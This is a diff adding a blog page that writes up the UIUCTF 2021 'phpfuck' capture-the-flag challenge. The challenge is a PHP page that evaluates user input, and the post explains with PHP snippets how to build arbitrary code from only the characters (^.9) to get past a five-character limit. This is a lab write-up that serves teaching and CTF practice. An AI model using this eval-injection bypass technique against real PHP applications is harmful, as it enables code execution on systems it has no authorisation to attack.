@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>UIUCTF 2021: phpfuck :: Mystify</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Credit. I stole the banner image from the background image of UIUCTF. I like the picture and their unique themes for these two CTFs&amp;hellip;  This is another time @blackb6a unites and plays UIUCTF together. It was my fourth time playing UIUCTF, and I still found the challenges fun. Although the crypto challenges are relatively easy, I had a lot of fun solving phpfuck with @02E774.
+Challenge Summary // Flag is inside ." />
+<meta name="keywords" content="ctf" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/2021-08-10-uiuctf-phpfuck/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+  <link rel="stylesheet" href="/assets/mystiz.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="/img/favicon/mystiz.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="mystiz613" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="UIUCTF 2021: phpfuck">
+<meta property="og:description" content="This is another time @blackb6a unites and plays UIUCTF together. It was my fourth time playing UIUCTF, and I still found the challenges fun. Although the crypto challenges are relatively easy, I had a lot of fun solving phpfuck with @02E774." />
+<meta property="og:url" content="/posts/2021-08-10-uiuctf-phpfuck/" />
+<meta property="og:site_name" content="Mystify" />
+
+  <meta property="og:image" content="/images/2021-08-10-uiuctf/background.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2021-08-10 23:59:59 &#43;0800 &#43;0800" />
+
+
+
+
+
+
+
+
+
+
+
+
+  <script data-ad-client="ca-pub-3220069814773012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+</head>
+<body class="mystiz">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Mystify
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about-me">About Me</a></li>
+        
+      
+        
+          <li><a href="/blogroll">Blogroll</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/crypto-in-ctf">Crypto in CTF</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about-me">About Me</a></li>
+      
+    
+      
+        <li><a href="/blogroll">Blogroll</a></li>
+      
+    
+      
+        <li><a href="/crypto-in-ctf">Crypto in CTF</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/posts/2021-08-10-uiuctf-phpfuck/">UIUCTF 2021: phpfuck</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2021-08-10 
+      </span>
+    
+    
+    <span class="post-author">:: Mystiz</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="/tags/ctf/">ctf</a>&nbsp;
+    
+    #<a href="/tags/uiuctf/">uiuctf</a>&nbsp;
+    
+    #<a href="/tags/phpfuck/">phpfuck</a>&nbsp;
+    
+  </span>
+  
+
+  
+    <img src="/images/2021-08-10-uiuctf/background.png" class="post-cover center" alt="UIUCTF 2021: phpfuck" />
+  
+
+  <div class="post-content js-toc-content"><div>
+        <div class="alert info">
+  <strong>Credit.</strong> I stole the banner image from the background image of UIUCTF. I like the picture and their unique themes for these two CTFs&hellip;
+</div>
+
+
+<p>This is another time <a href="https://twitter.com/blackb6a" target="_blank" rel="nofollow">@blackb6a</a> unites and plays UIUCTF together. It was my fourth time playing UIUCTF, and I still found the challenges fun. Although the crypto challenges are relatively easy, I had a lot of fun solving phpfuck with <a href="https://twitter.com/02E774" target="_blank" rel="nofollow">@02E774</a>.</p>
+
+<h2 id="challenge-summary">Challenge Summary<a href="#challenge-summary" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">// Flag is inside ./flag.php :)
+</span><span style="color:#75715e"></span>($x<span style="color:#f92672">=</span><span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;`&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#a6e22e">strval</span>($_REQUEST[<span style="color:#e6db74">&#34;x&#34;</span>])))<span style="color:#f92672">&amp;&amp;</span><span style="color:#a6e22e">strlen</span>(<span style="color:#a6e22e">count_chars</span>($x,<span style="color:#ae81ff">3</span>))<span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">5</span><span style="color:#f92672">?</span><span style="color:#66d9ef">print</span>(<span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">&#34;return </span><span style="color:#e6db74">$x</span><span style="color:#e6db74">;&#34;</span>))<span style="color:#f92672">:</span><span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>)<span style="color:#f92672">&amp;&amp;</span><span style="color:#a6e22e">phpinfo</span>();</code></pre></div>
+<p>We are given a PHP webpage (running on PHP 7.4.3) that evaluates a payload by us. However, the payload should consists of at most five distinct characters.</p>
+
+<div class="alert success">
+  <strong>What is the deliverable?</strong> I am now able to write PHP codes solely with the character set <code>(^.9)</code>.
+</div>
+
+
+<h2 id="solution">Solution<a href="#solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+
+<h3 id="part-i-background-story">Part I: Background story<a href="#part-i-background-story" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+
+<p><em>TWY</em> and <em>Ozetta</em> looked into the challenge earlier than I do. While I was solving the crypto challenges, they had various ideas on the set of characters to be used (for example <code>'().^</code>). I hopped into the challenge after the hint is released:</p>
+
+<blockquote>
+<p>HINT: Look, he has a monocle (^.9)</p>
+</blockquote>
+
+<p><em>Ozetta</em> said that we can form a character set with five letters from <code>(^.9)</code> and an additional character. We gotta decide what the character is.</p>
+
+<div class="alert danger">
+  <strong>No Way&hellip;</strong> If you are counting carefully, you should be able to notice that <code>(^.9)</code> is already five-letter long. I did not notice that until I crafted a payload.
+</div>
+
+
+<p>Although I was misled, some of the insights we had paved the way towards the flag. Anyway, while I was researching on the challenge, I stumbled across a Stack Overflow question that might be asked during the contest period. This is exactly what I need!</p>
+
+
+  <figure class="center" >
+    <img src="/images/2021-08-10-uiuctf/stackoverflow-1.png"   />
+    
+      <figcaption class="right" >Cloudsourcing the solution online.</figcaption>
+    
+  </figure>
+
+
+
+<p>Of course, you can see that I was baited because the link was already purple. Unfortunately the question does not lead me anywhere closer to the solution, since there are no answer - and it is not accepting any answers as well.</p>
+
+
+  <figure class="center" >
+    <img src="/images/2021-08-10-uiuctf/stackoverflow-2.png"   />
+    
+      <figcaption class="right" >The question is closed. <em>Credits: TWY.</em></figcaption>
+    
+  </figure>
+
+
+
+<h3 id="part-ii-building-blocks-for-arbitrary-command">Part II: Building blocks for arbitrary command<a href="#part-ii-building-blocks-for-arbitrary-command" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+
+<div class="alert info">
+  All of the trick comes from <em>Ozetta</em>. He is an absolute legend. If you are already a lengndary like <em>Ozetta</em>, you can just skip to the third part.
+</div>
+
+
+<p><strong>[Strings from numbers]</strong> This is a way to build strings from numbers without quotes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">var_dump</span>((<span style="color:#ae81ff">9</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9</span>)); <span style="color:#75715e">// string(2) &#34;99&#34;
+</span></code></pre></div>
+<p><strong>[Exclusive OR]</strong> Unlike other languages, PHP defined the <code>^</code> operator between two strings. If the lengths of the inputs are different, the length of the output is taken from the shorter string.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">var_dump</span>(<span style="color:#e6db74">&#34;y[&#34;</span> <span style="color:#f92672">^</span> <span style="color:#e6db74">&#34;12&#34;</span>); <span style="color:#75715e">// string(2) &#34;Hi&#34;
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">var_dump</span>(<span style="color:#e6db74">&#34;abcd&#34;</span> <span style="color:#f92672">^</span> <span style="color:#e6db74">&#34;123456&#34;</span>); <span style="color:#75715e">// string(4) &#34;PPPP&#34;
+</span></code></pre></div>
+<p><strong>[From nine and beyond]</strong> We are able to build more numbers with <code>9</code>, <code>^</code> and <code>.</code> - that may not consist solely of nines.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">var_dump</span>(<span style="color:#ae81ff">999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999</span>);
+<span style="color:#75715e">// float(INF)
+</span><span style="color:#75715e"></span>
+<span style="color:#a6e22e">var_dump</span>(<span style="color:#f92672">.</span><span style="color:#ae81ff">999999999999999</span>); <span style="color:#75715e">//float(1)
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">var_dump</span>(<span style="color:#ae81ff">9.999999999999999</span>); <span style="color:#75715e">// float(10)
+</span><span style="color:#75715e"></span>
+<span style="color:#a6e22e">var_dump</span>(<span style="color:#ae81ff">9</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>); <span style="color:#75715e">// int(0)
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">var_dump</span>(<span style="color:#ae81ff">9.9999999999999999</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>); <span style="color:#75715e">// int(3)
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">var_dump</span>(<span style="color:#ae81ff">9.9999999999999999</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span><span style="color:#f92672">^</span><span style="color:#ae81ff">99.999999999999999</span><span style="color:#f92672">^</span><span style="color:#ae81ff">99</span>); <span style="color:#75715e">// int(4)
+</span></code></pre></div>
+<p><strong>[chr Overflow]</strong> When the parameter of <code>chr</code> is not lying in $[0, 256)$, it will be taken modulo 256. For instance, $5678 \equiv 46\ (\text{mod}\ 256)$ and they returns the same character.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">chr</span>(<span style="color:#ae81ff">5678</span>)); <span style="color:#75715e">// string(1) &#34;.&#34;
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">chr</span>(<span style="color:#ae81ff">46</span>)); <span style="color:#75715e">// string(1) &#34;.&#34;
+</span></code></pre></div>
+<p><strong>[Case-insensitive function names]</strong> Functions are not case-sensitive.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">var_dump</span>(<span style="color:#ae81ff">1</span>); <span style="color:#75715e">// int(1)
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">VaR_dUmP</span>(<span style="color:#ae81ff">1</span>); <span style="color:#75715e">// int(1)
+</span></code></pre></div>
+<p><strong>[Calling functions from strings]</strong> One last thing that amazes me is that the strings can be called.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#e6db74">&#34;var_dump&#34;</span>(<span style="color:#ae81ff">1</span>); <span style="color:#75715e">// int(1)
+</span></code></pre></div>
+<h3 id="part-iii-building-chr-for-arbitrary-strings">Part III: Building <code>chr</code> for arbitrary strings<a href="#part-iii-building-chr-for-arbitrary-strings" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+
+<p>This may not be necessary. We can yet easily generate arbitrary characters if we are able to construct <code>c</code>, <code>h</code> and <code>r</code> (in any cases), as well as the digits. This can be achieved by constructing the string <code>chr</code> and supply the corresponding ASCII value as the parameter. Note that the parameter need not be a number - it can be a string:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">var_dump</span>(<span style="color:#e6db74">&#34;chr&#34;</span>(<span style="color:#ae81ff">97</span>)); <span style="color:#75715e">// string(1) &#34;a&#34;
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">var_dump</span>(<span style="color:#e6db74">&#34;chr&#34;</span>(<span style="color:#e6db74">&#34;97&#34;</span>)); <span style="color:#75715e">// string(1) &#34;a&#34;
+</span></code></pre></div>
+<p>We build <code>&quot;CHR&quot;</code> by xorring a bunch of strings those we are able to craft. This is definitely suboptimal, but we had finite time during the CTF:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">var_dump</span>((<span style="color:#e6db74">&#34;INF&#34;</span> <span style="color:#f92672">^</span> <span style="color:#e6db74">&#34;333&#34;</span> <span style="color:#f92672">^</span> <span style="color:#e6db74">&#34;999&#34;</span> <span style="color:#f92672">^</span> <span style="color:#e6db74">&#34;910&#34;</span> <span style="color:#f92672">^</span> <span style="color:#e6db74">&#34;040&#34;</span> <span style="color:#f92672">^</span> <span style="color:#e6db74">&#34;000&#34;</span> <span style="color:#f92672">^</span> <span style="color:#e6db74">&#34;99.&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;CHR&#34;</span>);
+<span style="color:#75715e">// bool(true)
+</span></code></pre></div>
+<p>This is how we built <code>INF</code>, <code>333</code>, ..., <code>99.</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">var_dump</span>((<span style="color:#ae81ff">999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9</span>));
+<span style="color:#75715e">// string(4) &#34;INF9&#34;
+</span><span style="color:#75715e"></span>
+<span style="color:#a6e22e">var_dump</span>((<span style="color:#ae81ff">9.9999999999999999</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9.9999999999999999</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9.9999999999999999</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>));
+<span style="color:#75715e">// string(3) &#34;333&#34;
+</span><span style="color:#75715e"></span>
+<span style="color:#a6e22e">var_dump</span>((<span style="color:#ae81ff">99</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9</span>));
+<span style="color:#75715e">// string(3) &#34;999&#34;
+</span><span style="color:#75715e"></span>
+<span style="color:#a6e22e">var_dump</span>((<span style="color:#ae81ff">9</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9.9999999999999999</span>));
+<span style="color:#75715e">// string(3) &#34;910&#34;
+</span><span style="color:#75715e"></span>
+<span style="color:#a6e22e">var_dump</span>((<span style="color:#ae81ff">9</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9.9999999999999999</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span><span style="color:#f92672">^</span><span style="color:#ae81ff">99.999999999999999</span><span style="color:#f92672">^</span><span style="color:#ae81ff">99</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>));
+<span style="color:#75715e">// string(3) &#34;040&#34;
+</span><span style="color:#75715e"></span>
+<span style="color:#a6e22e">var_dump</span>((<span style="color:#ae81ff">9</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>));
+<span style="color:#75715e">// string(3) &#34;000&#34;
+</span><span style="color:#75715e"></span>
+<span style="color:#a6e22e">var_dump</span>((<span style="color:#ae81ff">9</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9.9</span>));
+<span style="color:#75715e">// string(4) &#34;99.9&#34;
+</span></code></pre></div>
+<p>Wait - I did not build the exact strings. I made <code>INF9</code> instead of <code>INF</code>, and <code>99.9</code> instead of <code>99.</code>. However, it is fine because the <em>exclusive OR</em> property. Combining the things above, we are able to build <code>CHR</code> from <code>(^.9)</code> for our further action!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">var_dump</span>(((<span style="color:#ae81ff">999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9</span>))<span style="color:#f92672">^</span>((<span style="color:#ae81ff">9.9999999999999999</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9.9999999999999999</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9.9999999999999999</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>))<span style="color:#f92672">^</span>((<span style="color:#ae81ff">99</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9</span>))<span style="color:#f92672">^</span>((<span style="color:#ae81ff">9</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9.9999999999999999</span>))<span style="color:#f92672">^</span>((<span style="color:#ae81ff">9</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9.9999999999999999</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span><span style="color:#f92672">^</span><span style="color:#ae81ff">99.999999999999999</span><span style="color:#f92672">^</span><span style="color:#ae81ff">99</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>))<span style="color:#f92672">^</span>((<span style="color:#ae81ff">9</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>))<span style="color:#f92672">^</span>((<span style="color:#ae81ff">99.9</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9</span>)));
+<span style="color:#75715e">// string(3) &#34;CHR&#34;
+</span></code></pre></div>
+<h3 id="part-iv-building-a-number-basis">Part IV: Building a number basis<a href="#part-iv-building-a-number-basis" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+
+<p>In part II, I mentioned how to build some numbers. We are going to construct seven numbers which respectively lies on $[64, 128)$, $[32, 64)$, $[16, 32)$, $[8, 16)$, $[4, 8)$, $[2, 4)$ and $[1, 2)$ under modulo 256. With the seven numbers, we are able to build an arbitrary number in $[0, 128)$ (which covers the printable characters) under modulo 256. Here are the seven numbers:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ae81ff">9999999</span>                        <span style="color:#75715e">// mod 256 = 127
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">999999</span>                         <span style="color:#75715e">// mod 256 =  63
+</span><span style="color:#75715e"></span>((<span style="color:#f92672">.</span><span style="color:#ae81ff">99999999999999999</span>)<span style="color:#f92672">.</span>(<span style="color:#ae81ff">9</span>))<span style="color:#f92672">^</span><span style="color:#ae81ff">9</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span> <span style="color:#75715e">//         =  19
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">9999</span>                           <span style="color:#75715e">// mod 256 =  15
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">99.999999999999999</span><span style="color:#f92672">^</span><span style="color:#ae81ff">99</span>          <span style="color:#75715e">//         =   7
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">9.9999999999999999</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>           <span style="color:#75715e">//         =   3
+</span><span style="color:#75715e"></span><span style="color:#f92672">.</span><span style="color:#ae81ff">99999999999999999</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span><span style="color:#f92672">^</span><span style="color:#ae81ff">9</span>         <span style="color:#75715e">//         =   1
+</span></code></pre></div>
+<p>We are able to build an arbitrary number within $[0, 128)$. For example, <code>89</code> can be constructed as <code>127 ^ 32 ^ 7 ^ 1</code>. <code>6 = 7 ^ 1</code> and <code>40 = 32 ^ 15 ^ 7</code>, etc.</p>
+
+<h3 id="part-v-crafting-the-final-payload">Part V: Crafting the final payload<a href="#part-v-crafting-the-final-payload" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+
+<p>Now we have prepared the whole thing. I wrote a little Python script to craft the payload by itself and got the flag: <code>uiuctf{pl3as3_n0_m0rE_pHpee_9f4e3058}</code>. 🎉</p>
+
+<p>I am curious how short could the payload be - I think there are a lot of places that the payload can be shortened and optimized. We could find that out!</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="/posts/2021-10-11-pbctf/">
+                <span class="button__icon">←</span>
+                <span class="button__text">pbctf 2021: Seed Me &amp; Yet Another RSA</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="/posts/2021-07-24-gooogle-ctf/">
+                <span class="button__text">Google CTF 2021 Quals Writeup</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+
+<aside class="toc-container">
+  <a href="#" style="text-decoration: none; font-weight: 700;">
+    UIUCTF 2021: phpfuck
+  </a>
+  <div class="js-toc"></div>
+</aside>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.css" integrity="sha512-SFw7k74K3983tyOlJIHa8atr9Ppef3Kix5cmifwzU7ZdtU2E0FRuOVRtd3ENpMJ8sNCie5hlb/0j23efcdQJXA==" crossorigin="anonymous" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.js" integrity="sha512-oD3xGN8YTxenx6tdS4D/RKqO4OtORBQtAb2/FseM17GGMIi6jMwKUBc8duX4A5RwMOGGXoFBZrsqbOk8GpXFgQ==" crossorigin="anonymous"></script>
+
+<script type="text/javascript">
+  tocbot.init({
+      headingSelector: 'h1, h2, h3, h4',
+      orderedList: false,
+      headingLabelCallback: s => s.substr(0, s.length-2),
+      collapseDepth: 2
+  });
+</script>
+
+
+
+  </div>
+  <aside class="ads">
+    
+  
+  <ins class="adsbygoogle"
+    style="display:block"
+    data-ad-client="ca-pub-3220069814773012"
+    data-ad-slot="6927401005"
+    data-ad-format="auto"
+    data-full-width-responsive="true"></ins>
+  <script>
+    (adsbygoogle = window.adsbygoogle || []).push({});
+  </script>
+
+
+  </aside>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2021 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
+  integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"
+  integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
+  integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
+  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }], trust: true })"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/viz.js/2.1.2/viz.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/viz.js/2.1.2/full.render.js"></script>
+<script>
+var viz = new Viz();
+
+document.querySelectorAll("[class=graphviz]").forEach(node => {
+  const escape = function (s) {
+    const t = s.replace(/&amp;/g, '&')
+    return t.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&#34;/g, '"')
+  }
+  viz.renderSVGElement(escape(node.innerText), {
+    engine: 'dot'
+  }).then(function (element) {
+    node.parentNode.appendChild(element)
+    node.style.display = 'none'
+  })
+})
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+<script>
+mermaid.initialize({
+    startOnLoad: true,
+    htmlLabels: true,
+    securityLevel: "loose",
+    theme: 'base',
+    themeVariables: {
+        background: '#22222c',
+        primaryColor: '#33333c',
+        primaryTextColor: '#ffe4e1',
+    }
+});
+</script>
+
+  
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-180181192-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-180181192-1');
+</script>
+
+
+
+  
+</div>
+
+</body>
+</html>
